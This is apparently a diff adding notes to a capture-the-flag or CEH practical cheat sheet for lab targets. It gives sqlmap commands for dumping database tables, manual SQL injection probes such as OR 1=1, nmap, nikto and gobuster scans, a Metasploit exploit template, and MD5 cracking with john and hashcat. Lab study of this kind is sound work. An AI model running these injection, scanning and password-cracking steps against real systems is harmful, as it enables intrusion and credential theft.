@@ -472,5 +472,86 @@ sqlmap -u "http://movies.cehorg.com/movie.php?id=2" -D movies --tables
 sqlmap -u "http://movies.cehorg.com/movie.php?id=2" -D movies -T users --columns
 sqlmap -u "http://movies.cehorg.com/movie.php?id=2" --sql-query="SELECT COUNT(*) FROM users"
 ---
+web application exploitation / flag capture / page with page_id=84
+Open: http://www.cehorg.com
+Look for URLs such as: page.php?page_id=1   or  index.php?page_id=5
+Change the value manually: ?page_id=84
+Example: http://www.cehorg.com/page.php?page_id=84
+If the parameter is vulnerable:
+Try: ?page_id=84'   or  ?page_id=84 OR 1=1
+Indicators:
+SQL errors
+Different page behavior
+Extra content displayed
+Open: Burp Suite
+Intercept requests
+Send target request to Repeater
+Modify: page_id
+Observe responses
+If you identify an injectable parameter: sqlmap -u "http://www.cehorg.com/page.php?page_id=84" --batch;
+Full Workflow:
+1. Browse the site
+2. Identify page_id parameter
+3. Change page_id=84
+4. Observe response
+5. Test for SQL injection
+6. Inspect source code
+7. Extract flag
+---
+vulnerability research and exploit the web application
+Scan the Target: nmap -sV -sC 192.168.0.64    or    nmap -A -p- 192.168.0.64
+Look for:
+Apache/Nginx/IIS
+PHP versions
+CMS platforms
+Admin panels
+Browse the Application: 
+Open: http://training.cehorg.com  or  http://192.168.0.64
+Check:
+Login pages
+Upload forms
+Search bars
+URL parameters
+CMS fingerprints
+Identify Technologies: nikto -h http://192.168.0.64
+Look for:
+Outdated software
+Dangerous files
+Vulnerable scripts
+Misconfigurations
+Use Metasploit: 
+msfconsole
+search wordpress
+Configure exploit:
+use exploit/...
+set RHOSTS 192.168.0.64
+run
+Locate Flag.txt:
+Linux target: find / -name "Flag.txt" 2>/dev/null
+Windows target: dir C:\Flag.txt /s
+cat /path/to/Flag.txt
+type C:\path\Flag.txt;
+Full Workflow:
+nmap -sV -sC 192.168.0.64
+nikto -h http://192.168.0.64
+gobuster dir -u http://192.168.0.64 -w /usr/share/wordlists/dirb/common.txt
+---
+echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
+john --format=raw-md5 hash.txt
+john --show hash.txt
+
+echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
+hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 0 hash.txt --show
+
+Full Workflow Example
+1. Login to DVWA
+2. Browse to:
+   /DVWA/hackable/uploads/Hast.txt
+3. Copy MD5 hash
+4. Crack using John or CrackStation
+5. Submit plaintext
+
+john --format=raw-md5 hash.txt
 
 
